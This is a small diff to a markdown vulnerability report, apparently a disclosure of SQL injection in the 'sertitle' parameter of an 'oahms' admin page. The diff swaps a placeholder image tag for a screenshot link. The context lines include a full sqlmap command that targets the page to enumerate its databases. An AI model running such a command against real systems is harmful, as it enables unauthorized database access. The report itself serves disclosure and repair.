@@ -67,7 +67,8 @@ Parameter: sertitle (POST)
     sqlmap -u "http://10.20.33.25/oahms/admin/manage-services.php" --data="sertitle=1&dob=111111-11-11&contnum=1&commadd=1&emeradd=1&emercontnum=1&submit=" --dbs
 ```
 
-<img width="929" alt="Image" 删除这一行再粘贴图片 />
+![WeChat4a72652cd4690fdfb385113598940cf7](https://github.com/user-attachments/assets/f82f97da-7e70-46e6-91f3-fd207ee03cc1)
+
 
 # Suggested repair
 
